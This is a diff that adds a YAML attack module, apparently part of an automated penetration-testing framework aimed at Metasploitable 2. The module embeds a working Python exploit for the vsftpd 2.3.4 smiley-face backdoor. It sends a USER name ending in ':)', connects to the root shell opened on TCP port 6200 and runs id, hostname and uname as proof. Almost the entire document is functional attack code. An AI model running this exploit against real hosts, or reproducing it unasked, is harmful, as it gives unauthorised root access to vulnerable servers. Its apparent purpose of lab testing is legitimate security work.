@@ -1,0 +1,48 @@
+name: MS2 vsftpd 2.3.4 Backdoor
+description: >
+  Triggers the vsftpd 2.3.4 smiley-face backdoor on Metasploitable 2 and
+  opens a root shell on TCP 6200, returning id/hostname/uname proof.
+platforms:
+- linux
+scenario: metasploitable
+vector: vsftpd_backdoor
+mitre: T1190
+trigger:
+- ftp
+steps:
+- kind: lazymode
+  lang: python
+  timeout: 60
+  run: |
+    import socket, time
+
+    def recv(sock, t=4):
+        sock.settimeout(t)
+        try:
+            return sock.recv(8192)
+        except Exception:
+            return b""
+
+    result = {"target": target, "vector": "vsftpd_2.3.4_backdoor"}
+    ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ftp.settimeout(6)
+    ftp.connect((target, 21))
+    result["ftp_banner"] = recv(ftp).decode(errors="replace").strip()
+    ftp.sendall(b"USER lazyowned:)\r\n"); recv(ftp)
+    ftp.sendall(b"PASS lazy\r\n"); recv(ftp)
+    time.sleep(1.5)
+    try:
+        bd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        bd.settimeout(6)
+        bd.connect((target, 6200))
+        bd.sendall(b"id; hostname; uname -a\n")
+        time.sleep(1.5)
+        result["session_opened"] = True
+        result["backdoor_port"] = 6200
+        result["proof"] = recv(bd).decode(errors="replace").strip()
+        bd.close()
+    except Exception as exc:
+        result["session_opened"] = False
+        result["error"] = f"{type(exc).__name__}: {exc}"
+    finally:
+        ftp.close()
